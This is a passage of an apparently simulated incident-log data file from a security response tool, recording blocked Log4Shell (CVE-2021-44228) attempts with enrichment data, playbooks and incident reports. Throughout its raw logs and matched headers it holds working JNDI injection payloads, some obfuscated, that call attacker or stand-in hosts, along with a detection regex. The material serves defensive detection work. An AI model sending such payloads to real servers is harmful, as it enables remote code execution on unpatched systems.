+          "timestamp": "2026-03-08T02:01:47.330Z",
+          "level": "ERROR",
+          "message": "CRITICAL: Firing Log4Shell alert to DART for IP: 45.142.212.100 jndi_url: ldap://185.220.101.34/a"
+        },
+        {
+          "timestamp": "2026-03-08T02:01:47.342Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 80.82.77.139 | header: referer | payload: ${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/x} | jndi_url: unknown"
+        },
+        {
+          "timestamp": "2026-03-08T02:01:47.342Z",
+          "level": "ERROR",
+          "message": "CRITICAL: Firing Log4Shell alert to DART for IP: 80.82.77.139 jndi_url: null"
+        },
+        {
+          "timestamp": "2026-03-08T02:01:47.345Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 89.248.167.131 | header: user-agent | payload: ${jndi:ldap://45.142.212.100:1389/exploit} | jndi_url: ldap://45.142.212.100:1389/exploit"
+        }
+      ]
+    },
+    "enrichment": {
+      "enrichedIP": "89.248.167.131",
+      "greynoise": {
+        "classification": "malicious",
+        "name": "Recyber Scanning",
+        "tags": [
+          "scanner",
+          "web-crawler"
+        ]
+      },
+      "abuseipdb": {
+        "abuseConfidenceScore": 100,
+        "totalReports": 9841,
+        "countryCode": "NL"
+      },
+      "geoip": {
+        "country": "unknown",
+        "city": "unknown",
+        "isp": "unknown"
+      },
+      "virustotal": {
+        "malicious": 6,
+        "suspicious": 1,
+        "harmless": 66
+      }
+    },
+    "risk_score": 95,
+    "risk_reasoning": "Log4Shell exploitation attempt detected (CVE-2021-44228, CVSS 10.0). Malicious JNDI payload found in HTTP headers: user-agent. JNDI callback URL: ldap://45.142.212.100:1389/exploit. GreyNoise: malicious [scanner, web-crawler]. AbuseIPDB: 100/100.",
+    "selected_playbook": "log4shell-patch-isolate",
+    "playbook_status": "completed",
+    "playbook_result": {
+      "playbook_id": "log4shell-patch-isolate",
+      "steps_executed": [
+        "block_attacker_ip",
+        "tighten_rate_limit",
+        "flag_jndi_endpoint",
+        "simulate_patch_application",
+        "restore_rate_limit",
+        "schedule_ip_unblock_5min"
+      ],
+      "success": true,
+      "incident_report": {
+        "title": "Log4Shell Exploitation Attempt Detected & Blocked",
+        "cve_id": "CVE-2021-44228",
+        "cvss_score": 10,
+        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+        "severity": "CRITICAL",
+        "attacker_ip": "89.248.167.131",
+        "enriched_ip": "89.248.167.131",
+        "attacker_location": "unknown, unknown",
+        "attacker_isp": "unknown",
+        "greynoise_classification": "malicious",
+        "greynoise_tags": [
+          "scanner",
+          "web-crawler"
+        ],
+        "abuseipdb_score": 100,
+        "abuseipdb_reports": 9841,
+        "jndi_payload": "ldap://45.142.212.100:1389/exploit",
+        "matched_headers": [
+          {
+            "header": "user-agent",
+            "value": "${jndi:ldap://45.142.212.100:1389/exploit}",
+            "pattern": "/\\$\\{jndi:/i"
+          }
+        ],
+        "affected_component": "HTTP Header Parser (WAF Layer)",
+        "attack_description": "Attacker injected JNDI lookup string into HTTP headers attempting to trigger remote class loading via Log4j CVE-2021-44228. Request was intercepted by DART WAF layer before reaching application.",
+        "remediation_applied": [
+          "Attacker IP blocked at WAF layer",
+          "Rate limit tightened during isolation window",
+          "Affected endpoint flagged for security review",
+          "Patch simulation applied (Log4j 2.15.0+ equivalent)",
+          "IP unblock scheduled for 5 minutes"
+        ],
+        "patch_recommendation": "Upgrade Apache Log4j to version 2.17.1 or later. Set log4j2.formatMsgNoLookups=true as interim mitigation. Review all Java dependencies for transitive Log4j usage.",
+        "response_time_ms": 3085,
+        "detected_at": "2026-03-08T02:01:47.661Z",
+        "contained_at": "2026-03-08T02:01:50.746Z"
+      },
+      "ip_blocked": "89.248.167.131",
+      "unblock_scheduled_in": "5 minutes",
+      "response_time_ms": 3085,
+      "notes": "CVE-2021-44228 attempt blocked and contained. Full incident report generated."
+    },
+    "analyst_feedback": null,
+    "cve_id": "CVE-2021-44228",
+    "cvss_score": 10,
+    "jndi_url": "ldap://45.142.212.100:1389/exploit",
+    "matched_headers": [
+      {
+        "header": "user-agent",
+        "value": "${jndi:ldap://45.142.212.100:1389/exploit}",
+        "pattern": "/\\$\\{jndi:/i"
+      }
+    ],
+    "match_count": 1
+  },
+  {
+    "id": "7b235de8-d575-4c34-a31a-b2505516fa1e",
+    "timestamp": "2026-03-08T02:01:47.654Z",
+    "source_ip": "45.142.212.100",
+    "enriched_ip": "45.142.212.100",
+    "alert_type": "log4shell_attempt",
+    "severity": "critical",
+    "raw_alert": {
+      "source_ip": "45.142.212.100",
+      "alert_type": "log4shell_attempt",
+      "request_rate": 0,
+      "anomaly_detected": true,
+      "cve_id": "CVE-2021-44228",
+      "cvss_score": 10,
+      "jndi_url": "ldap://185.220.101.34/a",
+      "matched_headers": [
+        {
+          "header": "x-api-version",
+          "value": "${jndi:ldap://185.220.101.34/a}",
+          "pattern": "/\\$\\{jndi:/i"
+        }
+      ],
+      "match_count": 1,
+      "attempt_count": 1,
+      "raw_logs": [
+        {
+          "timestamp": "2026-03-08T01:58:29.969Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 80.82.77.139 | header: x-forwarded-for-original | payload: ${jndi:dns://185.220.101.34/pwned} | jndi_url: dns://185.220.101.34/pwned"
+        },
+        {
+          "timestamp": "2026-03-08T01:58:30.475Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 198.235.24.130"
+        },
+        {
+          "timestamp": "2026-03-08T01:58:30.479Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 80.82.77.139 | header: true-client-ip | payload: ${jndi:ldap://45.142.212.100:1389/exploit} | jndi_url: ldap://45.142.212.100:1389/exploit"
+        },
+        {
+          "timestamp": "2026-03-08T01:58:30.483Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 185.220.101.34 | header: user-agent | payload: ${jndi:ldap://185.220.101.34/a} | jndi_url: ldap://185.220.101.34/a"
+        },
+        {
+          "timestamp": "2026-03-08T01:58:30.989Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 185.220.101.34 | header: accept-language | payload: ${${upper:j}ndi:ldap://attacker.com/exploit} | jndi_url: unknown"
+        },
+        {
+          "timestamp": "2026-03-08T01:58:30.994Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 89.248.167.131 | header: referer | payload: ${jndi:${lower:l}${lower:d}a${lower:p}://evil.com/a} | jndi_url: ${lower:l"
+        },
+        {
+          "timestamp": "2026-03-08T01:58:30.998Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 45.142.212.100 | header: x-api-version | payload: ${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/x} | jndi_url: unknown"
+        },
+        {
+          "timestamp": "2026-03-08T01:58:31.509Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 80.82.77.139 | header: x-forwarded-for-original | payload: ${jndi:rmi://45.142.212.100:1099/exploit} | jndi_url: rmi://45.142.212.100:1099/exploit"
+        },
+        {
+          "timestamp": "2026-03-08T01:58:31.514Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 89.248.167.131"
+        },
+        {
+          "timestamp": "2026-03-08T01:58:31.517Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 80.82.77.139 | header: x-client-ip | payload: ${jndi:dns://185.220.101.34/pwned} | jndi_url: dns://185.220.101.34/pwned"
+        },
+        {
+          "timestamp": "2026-03-08T01:58:32.023Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 89.248.167.131 | header: user-agent | payload: ${jndi:ldap://45.142.212.100:1389/exploit} | jndi_url: ldap://45.142.212.100:1389/exploit"
+        },
+        {
+          "timestamp": "2026-03-08T01:58:32.029Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 198.235.24.130 | header: x-api-version | payload: ${jndi:ldap://185.220.101.34/a} | jndi_url: ldap://185.220.101.34/a"
+        },
+        {
+          "timestamp": "2026-03-08T01:58:32.033Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 185.220.101.34 | header: referer | payload: ${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/x} | jndi_url: unknown"
+        },
+        {
+          "timestamp": "2026-03-08T01:58:32.541Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 198.235.24.130 | header: accept-language | payload: ${jndi:${lower:l}${lower:d}a${lower:p}://evil.com/a} | jndi_url: ${lower:l"
+        },
+        {
+          "timestamp": "2026-03-08T01:58:32.545Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 89.248.167.131 | header: x-forwarded-for-original | payload: ${${upper:j}ndi:ldap://attacker.com/exploit} | jndi_url: unknown"
+        },
+        {
+          "timestamp": "2026-03-08T01:58:32.547Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 89.248.167.131 | header: x-client-ip | payload: ${jndi:rmi://45.142.212.100:1099/exploit} | jndi_url: rmi://45.142.212.100:1099/exploit"
+        },
+        {
+          "timestamp": "2026-03-08T01:58:33.054Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 45.142.212.100 | header: true-client-ip | payload: ${jndi:dns://185.220.101.34/pwned} | jndi_url: dns://185.220.101.34/pwned"
+        },
+        {
+          "timestamp": "2026-03-08T01:58:33.058Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 198.235.24.130 | header: x-api-version | payload: ${jndi:ldap://45.142.212.100:1389/exploit} | jndi_url: ldap://45.142.212.100:1389/exploit"
+        },
+        {
+          "timestamp": "2026-03-08T01:58:33.062Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 80.82.77.139"
+        },
+        {
+          "timestamp": "2026-03-08T02:01:47.330Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 45.142.212.100 | header: x-api-version | payload: ${jndi:ldap://185.220.101.34/a} | jndi_url: ldap://185.220.101.34/a"
+        }
+      ]
+    },
+    "enrichment": {
+      "enrichedIP": "45.142.212.100",
+      "greynoise": {
+        "classification": "malicious",
+        "name": "Mass Scanner",
+        "tags": [
+          "scanner",
+          "bruteforce"
+        ]
+      },
+      "abuseipdb": {
+        "abuseConfidenceScore": 100,
+        "totalReports": 5213,
+        "countryCode": "RU"
+      },
+      "geoip": {
+        "country": "unknown",
+        "city": "unknown",
+        "isp": "unknown"
+      },
+      "virustotal": {
+        "malicious": 8,
+        "suspicious": 2,
+        "harmless": 63
+      }
+    },
+    "risk_score": 95,
+    "risk_reasoning": "Log4Shell exploitation attempt detected (CVE-2021-44228, CVSS 10.0). Malicious JNDI payload found in HTTP headers: x-api-version. JNDI callback URL: ldap://185.220.101.34/a. GreyNoise: malicious [scanner, bruteforce]. AbuseIPDB: 100/100.",
+    "selected_playbook": "log4shell-patch-isolate",
+    "playbook_status": "completed",
+    "playbook_result": {
+      "playbook_id": "log4shell-patch-isolate",
+      "steps_executed": [
+        "block_attacker_ip",
+        "tighten_rate_limit",
+        "flag_jndi_endpoint",
+        "simulate_patch_application",
+        "restore_rate_limit",
+        "schedule_ip_unblock_5min"
+      ],
+      "success": true,
+      "incident_report": {
+        "title": "Log4Shell Exploitation Attempt Detected & Blocked",
+        "cve_id": "CVE-2021-44228",
+        "cvss_score": 10,
+        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+        "severity": "CRITICAL",
+        "attacker_ip": "45.142.212.100",
+        "enriched_ip": "45.142.212.100",
+        "attacker_location": "unknown, unknown",
+        "attacker_isp": "unknown",
+        "greynoise_classification": "malicious",
+        "greynoise_tags": [
+          "scanner",
+          "bruteforce"
+        ],
+        "abuseipdb_score": 100,
+        "abuseipdb_reports": 5213,
+        "jndi_payload": "ldap://185.220.101.34/a",
+        "matched_headers": [
+          {
+            "header": "x-api-version",
+            "value": "${jndi:ldap://185.220.101.34/a}",
+            "pattern": "/\\$\\{jndi:/i"
+          }
+        ],
+        "affected_component": "HTTP Header Parser (WAF Layer)",
+        "attack_description": "Attacker injected JNDI lookup string into HTTP headers attempting to trigger remote class loading via Log4j CVE-2021-44228. Request was intercepted by DART WAF layer before reaching application.",
+        "remediation_applied": [
+          "Attacker IP blocked at WAF layer",
+          "Rate limit tightened during isolation window",
+          "Affected endpoint flagged for security review",
+          "Patch simulation applied (Log4j 2.15.0+ equivalent)",
+          "IP unblock scheduled for 5 minutes"
+        ],
+        "patch_recommendation": "Upgrade Apache Log4j to version 2.17.1 or later. Set log4j2.formatMsgNoLookups=true as interim mitigation. Review all Java dependencies for transitive Log4j usage.",
+        "response_time_ms": 3093,
+        "detected_at": "2026-03-08T02:01:47.654Z",
+        "contained_at": "2026-03-08T02:01:50.748Z"
+      },
+      "ip_blocked": "45.142.212.100",
+      "unblock_scheduled_in": "5 minutes",
+      "response_time_ms": 3093,
+      "notes": "CVE-2021-44228 attempt blocked and contained. Full incident report generated."
+    },
+    "analyst_feedback": null,
+    "cve_id": "CVE-2021-44228",
+    "cvss_score": 10,
+    "jndi_url": "ldap://185.220.101.34/a",
+    "matched_headers": [
+      {
+        "header": "x-api-version",
+        "value": "${jndi:ldap://185.220.101.34/a}",
+        "pattern": "/\\$\\{jndi:/i"
+      }
+    ],
+    "match_count": 1
+  },
+  {
+    "id": "cada5b9f-d1d0-4237-8492-d666a4c0df64",
+    "timestamp": "2026-03-08T02:01:48.642Z",
+    "source_ip": "198.235.24.130",
+    "enriched_ip": "198.235.24.130",
+    "alert_type": "log4shell_attempt",
+    "severity": "critical",
+    "raw_alert": {
+      "source_ip": "198.235.24.130",
+      "alert_type": "log4shell_attempt",
+      "request_rate": 0,
+      "anomaly_detected": true,
+      "cve_id": "CVE-2021-44228",
+      "cvss_score": 10,
+      "jndi_url": "dns://185.220.101.34/pwned",
+      "matched_headers": [
+        {
+          "header": "true-client-ip",
+          "value": "${jndi:dns://185.220.101.34/pwned}",
+          "pattern": "/\\$\\{jndi:/i"
+        }
+      ],
+      "match_count": 1,
+      "attempt_count": 1,
+      "raw_logs": [
+        {
+          "timestamp": "2026-03-08T01:58:32.547Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 89.248.167.131 | header: x-client-ip | payload: ${jndi:rmi://45.142.212.100:1099/exploit} | jndi_url: rmi://45.142.212.100:1099/exploit"
+        },
+        {
+          "timestamp": "2026-03-08T01:58:33.054Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 45.142.212.100 | header: true-client-ip | payload: ${jndi:dns://185.220.101.34/pwned} | jndi_url: dns://185.220.101.34/pwned"
+        },
+        {
+          "timestamp": "2026-03-08T01:58:33.058Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 198.235.24.130 | header: x-api-version | payload: ${jndi:ldap://45.142.212.100:1389/exploit} | jndi_url: ldap://45.142.212.100:1389/exploit"
+        },
+        {
+          "timestamp": "2026-03-08T01:58:33.062Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 80.82.77.139"
+        },
+        {
+          "timestamp": "2026-03-08T02:01:47.330Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 45.142.212.100 | header: x-api-version | payload: ${jndi:ldap://185.220.101.34/a} | jndi_url: ldap://185.220.101.34/a"
+        },
+        {
+          "timestamp": "2026-03-08T02:01:47.330Z",
+          "level": "ERROR",
+          "message": "CRITICAL: Firing Log4Shell alert to DART for IP: 45.142.212.100 jndi_url: ldap://185.220.101.34/a"
+        },
+        {
+          "timestamp": "2026-03-08T02:01:47.342Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 80.82.77.139 | header: referer | payload: ${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/x} | jndi_url: unknown"
+        },
+        {
+          "timestamp": "2026-03-08T02:01:47.342Z",
+          "level": "ERROR",
+          "message": "CRITICAL: Firing Log4Shell alert to DART for IP: 80.82.77.139 jndi_url: null"
+        },
+        {
+          "timestamp": "2026-03-08T02:01:47.345Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 89.248.167.131 | header: user-agent | payload: ${jndi:ldap://45.142.212.100:1389/exploit} | jndi_url: ldap://45.142.212.100:1389/exploit"
+        },
+        {
+          "timestamp": "2026-03-08T02:01:47.345Z",
+          "level": "ERROR",
+          "message": "CRITICAL: Firing Log4Shell alert to DART for IP: 89.248.167.131 jndi_url: ldap://45.142.212.100:1389/exploit"
+        },
+        {
+          "timestamp": "2026-03-08T02:01:47.675Z",
+          "level": "WARN",
+          "message": "IP blocked by admin/playbook: 45.142.212.100"
+        },
+        {
+          "timestamp": "2026-03-08T02:01:47.679Z",
+          "level": "WARN",
+          "message": "IP blocked by admin/playbook: 80.82.77.139"
+        },
+        {
+          "timestamp": "2026-03-08T02:01:47.681Z",
+          "level": "WARN",
+          "message": "IP blocked by admin/playbook: 89.248.167.131"
+        },
+        {
+          "timestamp": "2026-03-08T02:01:47.684Z",
+          "level": "WARN",
+          "message": "Rate limit changed: 100 → 20 req/min"
+        },
+        {
+          "timestamp": "2026-03-08T02:01:47.689Z",
+          "level": "WARN",
+          "message": "Rate limit changed: 20 → 20 req/min"
+        },
+        {
+          "timestamp": "2026-03-08T02:01:47.693Z",
+          "level": "WARN",
+          "message": "Rate limit changed: 20 → 20 req/min"
+        },
+        {
+          "timestamp": "2026-03-08T02:01:47.854Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 45.142.212.100 | header: accept-language | payload: ${jndi:${lower:l}${lower:d}a${lower:p}://evil.com/a} | jndi_url: ${lower:l"
+        },
+        {
+          "timestamp": "2026-03-08T02:01:47.857Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 45.142.212.100 | header: x-forwarded-for-original | payload: ${${upper:j}ndi:ldap://attacker.com/exploit} | jndi_url: unknown"
+        },
+        {
+          "timestamp": "2026-03-08T02:01:47.859Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 89.248.167.131 | header: x-client-ip | payload: ${jndi:rmi://45.142.212.100:1099/exploit} | jndi_url: rmi://45.142.212.100:1099/exploit"
+        },
+        {
+          "timestamp": "2026-03-08T02:01:48.366Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 198.235.24.130 | header: true-client-ip | payload: ${jndi:dns://185.220.101.34/pwned} | jndi_url: dns://185.220.101.34/pwned"
+        }
+      ]
+    },
+    "enrichment": {
+      "enrichedIP": "198.235.24.130",
+      "greynoise": {
+        "classification": "malicious",
+        "name": "Known Botnet C2",
+        "tags": [
+          "botnet",
+          "c2"
+        ]
+      },
+      "abuseipdb": {
+        "abuseConfidenceScore": 87,
+        "totalReports": 1523,
+        "countryCode": "US"
+      },
+      "geoip": {
+        "country": "unknown",
+        "city": "unknown",
+        "isp": "unknown"
+      },
+      "virustotal": {
+        "malicious": 15,
+        "suspicious": 4,
+        "harmless": 52
+      }
+    },
+    "risk_score": 94,
+    "risk_reasoning": "Log4Shell exploitation attempt detected (CVE-2021-44228, CVSS 10.0). Malicious JNDI payload found in HTTP headers: true-client-ip. JNDI callback URL: dns://185.220.101.34/pwned. GreyNoise: malicious [botnet, c2]. AbuseIPDB: 87/100.",
+    "selected_playbook": "log4shell-patch-isolate",
+    "playbook_status": "completed",
+    "playbook_result": {
+      "playbook_id": "log4shell-patch-isolate",
+      "steps_executed": [
+        "block_attacker_ip",
+        "tighten_rate_limit",
+        "flag_jndi_endpoint",
+        "simulate_patch_application",
+        "restore_rate_limit",
+        "schedule_ip_unblock_5min"
+      ],
+      "success": true,
+      "incident_report": {
+        "title": "Log4Shell Exploitation Attempt Detected & Blocked",
+        "cve_id": "CVE-2021-44228",
+        "cvss_score": 10,
+        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+        "severity": "CRITICAL",
+        "attacker_ip": "198.235.24.130",
+        "enriched_ip": "198.235.24.130",
+        "attacker_location": "unknown, unknown",
+        "attacker_isp": "unknown",
+        "greynoise_classification": "malicious",
+        "greynoise_tags": [
+          "botnet",
+          "c2"
+        ],
+        "abuseipdb_score": 87,
+        "abuseipdb_reports": 1523,
+        "jndi_payload": "dns://185.220.101.34/pwned",
+        "matched_headers": [
+          {
+            "header": "true-client-ip",
+            "value": "${jndi:dns://185.220.101.34/pwned}",
+            "pattern": "/\\$\\{jndi:/i"
+          }
+        ],
+        "affected_component": "HTTP Header Parser (WAF Layer)",
+        "attack_description": "Attacker injected JNDI lookup string into HTTP headers attempting to trigger remote class loading via Log4j CVE-2021-44228. Request was intercepted by DART WAF layer before reaching application.",
+        "remediation_applied": [
+          "Attacker IP blocked at WAF layer",
+          "Rate limit tightened during isolation window",
+          "Affected endpoint flagged for security review",
+          "Patch simulation applied (Log4j 2.15.0+ equivalent)",
+          "IP unblock scheduled for 5 minutes"
+        ],
+        "patch_recommendation": "Upgrade Apache Log4j to version 2.17.1 or later. Set log4j2.formatMsgNoLookups=true as interim mitigation. Review all Java dependencies for transitive Log4j usage.",
+        "response_time_ms": 3060,
+        "detected_at": "2026-03-08T02:01:48.642Z",
+        "contained_at": "2026-03-08T02:01:51.702Z"
+      },
+      "ip_blocked": "198.235.24.130",
+      "unblock_scheduled_in": "5 minutes",
+      "response_time_ms": 3060,
+      "notes": "CVE-2021-44228 attempt blocked and contained. Full incident report generated."
+    },
+    "analyst_feedback": null,
+    "cve_id": "CVE-2021-44228",
+    "cvss_score": 10,
+    "jndi_url": "dns://185.220.101.34/pwned",
+    "matched_headers": [
+      {
+        "header": "true-client-ip",
+        "value": "${jndi:dns://185.220.101.34/pwned}",
+        "pattern": "/\\$\\{jndi:/i"
+      }
+    ],
+    "match_count": 1
+  },
+  {
+    "id": "9a5c1777-b741-4866-ac78-0158fa9fa18f",
+    "timestamp": "2026-03-08T02:01:48.646Z",
+    "source_ip": "185.220.101.34",
+    "enriched_ip": "185.220.101.34",
+    "alert_type": "log4shell_attempt",
+    "severity": "critical",
+    "raw_alert": {
+      "source_ip": "185.220.101.34",
+      "alert_type": "log4shell_attempt",
+      "request_rate": 0,
+      "anomaly_detected": true,
+      "cve_id": "CVE-2021-44228",
+      "cvss_score": 10,
+      "jndi_url": "ldap://45.142.212.100:1389/exploit",
+      "matched_headers": [
+        {
+          "header": "x-api-version",
+          "value": "${jndi:ldap://45.142.212.100:1389/exploit}",
+          "pattern": "/\\$\\{jndi:/i"
+        }
+      ],
+      "match_count": 1,
+      "attempt_count": 1,
+      "raw_logs": [
+        {
+          "timestamp": "2026-03-08T01:58:33.062Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 80.82.77.139"
+        },
+        {
+          "timestamp": "2026-03-08T02:01:47.330Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 45.142.212.100 | header: x-api-version | payload: ${jndi:ldap://185.220.101.34/a} | jndi_url: ldap://185.220.101.34/a"
+        },
+        {
+          "timestamp": "2026-03-08T02:01:47.330Z",
+          "level": "ERROR",
+          "message": "CRITICAL: Firing Log4Shell alert to DART for IP: 45.142.212.100 jndi_url: ldap://185.220.101.34/a"
+        },
+        {
+          "timestamp": "2026-03-08T02:01:47.342Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 80.82.77.139 | header: referer | payload: ${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/x} | jndi_url: unknown"
+        },
+        {
+          "timestamp": "2026-03-08T02:01:47.342Z",
+          "level": "ERROR",
+          "message": "CRITICAL: Firing Log4Shell alert to DART for IP: 80.82.77.139 jndi_url: null"
+        },
+        {
+          "timestamp": "2026-03-08T02:01:47.345Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 89.248.167.131 | header: user-agent | payload: ${jndi:ldap://45.142.212.100:1389/exploit} | jndi_url: ldap://45.142.212.100:1389/exploit"
+        },
+        {
+          "timestamp": "2026-03-08T02:01:47.345Z",
+          "level": "ERROR",
+          "message": "CRITICAL: Firing Log4Shell alert to DART for IP: 89.248.167.131 jndi_url: ldap://45.142.212.100:1389/exploit"
+        },
+        {
+          "timestamp": "2026-03-08T02:01:47.675Z",
+          "level": "WARN",
+          "message": "IP blocked by admin/playbook: 45.142.212.100"
+        },
+        {
+          "timestamp": "2026-03-08T02:01:47.679Z",
+          "level": "WARN",
+          "message": "IP blocked by admin/playbook: 80.82.77.139"
+        },
+        {
+          "timestamp": "2026-03-08T02:01:47.681Z",
+          "level": "WARN",
+          "message": "IP blocked by admin/playbook: 89.248.167.131"
+        },
+        {
+          "timestamp": "2026-03-08T02:01:47.684Z",
+          "level": "WARN",
+          "message": "Rate limit changed: 100 → 20 req/min"
+        },
+        {
+          "timestamp": "2026-03-08T02:01:47.689Z",
+          "level": "WARN",
+          "message": "Rate limit changed: 20 → 20 req/min"
+        },
+        {
+          "timestamp": "2026-03-08T02:01:47.693Z",
+          "level": "WARN",
+          "message": "Rate limit changed: 20 → 20 req/min"
+        },
+        {
+          "timestamp": "2026-03-08T02:01:47.854Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 45.142.212.100 | header: accept-language | payload: ${jndi:${lower:l}${lower:d}a${lower:p}://evil.com/a} | jndi_url: ${lower:l"
+        },
+        {
+          "timestamp": "2026-03-08T02:01:47.857Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 45.142.212.100 | header: x-forwarded-for-original | payload: ${${upper:j}ndi:ldap://attacker.com/exploit} | jndi_url: unknown"
+        },
+        {
+          "timestamp": "2026-03-08T02:01:47.859Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 89.248.167.131 | header: x-client-ip | payload: ${jndi:rmi://45.142.212.100:1099/exploit} | jndi_url: rmi://45.142.212.100:1099/exploit"
+        },
+        {
+          "timestamp": "2026-03-08T02:01:48.366Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 198.235.24.130 | header: true-client-ip | payload: ${jndi:dns://185.220.101.34/pwned} | jndi_url: dns://185.220.101.34/pwned"
+        },
+        {
+          "timestamp": "2026-03-08T02:01:48.366Z",
+          "level": "ERROR",
+          "message": "CRITICAL: Firing Log4Shell alert to DART for IP: 198.235.24.130 jndi_url: dns://185.220.101.34/pwned"
+        },
+        {
+          "timestamp": "2026-03-08T02:01:48.371Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 80.82.77.139"
+        },
+        {
+          "timestamp": "2026-03-08T02:01:48.373Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 185.220.101.34 | header: x-api-version | payload: ${jndi:ldap://45.142.212.100:1389/exploit} | jndi_url: ldap://45.142.212.100:1389/exploit"
+        }
+      ]
+    },
+    "enrichment": {
+      "enrichedIP": "185.220.101.34",
+      "greynoise": {
+        "classification": "malicious",
+        "name": "Tor Exit Node",
+        "tags": [
+          "tor",
+          "vpn"
+        ]
+      },
+      "abuseipdb": {
+        "abuseConfidenceScore": 100,
+        "totalReports": 2847,
+        "countryCode": "DE"
+      },
+      "geoip": {
+        "country": "unknown",
+        "city": "unknown",
+        "isp": "unknown"
+      },
+      "virustotal": {
+        "malicious": 12,
+        "suspicious": 3,
+        "harmless": 58
+      }
+    },
+    "risk_score": 95,
+    "risk_reasoning": "Log4Shell exploitation attempt detected (CVE-2021-44228, CVSS 10.0). Malicious JNDI payload found in HTTP headers: x-api-version. JNDI callback URL: ldap://45.142.212.100:1389/exploit. GreyNoise: malicious [tor, vpn]. AbuseIPDB: 100/100.",
+    "selected_playbook": "log4shell-patch-isolate",
+    "playbook_status": "completed",
+    "playbook_result": {
+      "playbook_id": "log4shell-patch-isolate",
+      "steps_executed": [
+        "block_attacker_ip",
+        "tighten_rate_limit",
+        "flag_jndi_endpoint",
+        "simulate_patch_application",
+        "restore_rate_limit",
+        "schedule_ip_unblock_5min"
+      ],
+      "success": true,
+      "incident_report": {
+        "title": "Log4Shell Exploitation Attempt Detected & Blocked",
+        "cve_id": "CVE-2021-44228",
+        "cvss_score": 10,
+        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+        "severity": "CRITICAL",
+        "attacker_ip": "185.220.101.34",
+        "enriched_ip": "185.220.101.34",
+        "attacker_location": "unknown, unknown",
+        "attacker_isp": "unknown",
+        "greynoise_classification": "malicious",
+        "greynoise_tags": [
+          "tor",
+          "vpn"
+        ],
+        "abuseipdb_score": 100,
+        "abuseipdb_reports": 2847,
+        "jndi_payload": "ldap://45.142.212.100:1389/exploit",
+        "matched_headers": [
+          {
+            "header": "x-api-version",
+            "value": "${jndi:ldap://45.142.212.100:1389/exploit}",
+            "pattern": "/\\$\\{jndi:/i"
+          }
+        ],
+        "affected_component": "HTTP Header Parser (WAF Layer)",
+        "attack_description": "Attacker injected JNDI lookup string into HTTP headers attempting to trigger remote class loading via Log4j CVE-2021-44228. Request was intercepted by DART WAF layer before reaching application.",
+        "remediation_applied": [
+          "Attacker IP blocked at WAF layer",
+          "Rate limit tightened during isolation window",
+          "Affected endpoint flagged for security review",
+          "Patch simulation applied (Log4j 2.15.0+ equivalent)",
+          "IP unblock scheduled for 5 minutes"
+        ],
+        "patch_recommendation": "Upgrade Apache Log4j to version 2.17.1 or later. Set log4j2.formatMsgNoLookups=true as interim mitigation. Review all Java dependencies for transitive Log4j usage.",
+        "response_time_ms": 3061,
+        "detected_at": "2026-03-08T02:01:48.646Z",
+        "contained_at": "2026-03-08T02:01:51.707Z"
+      },
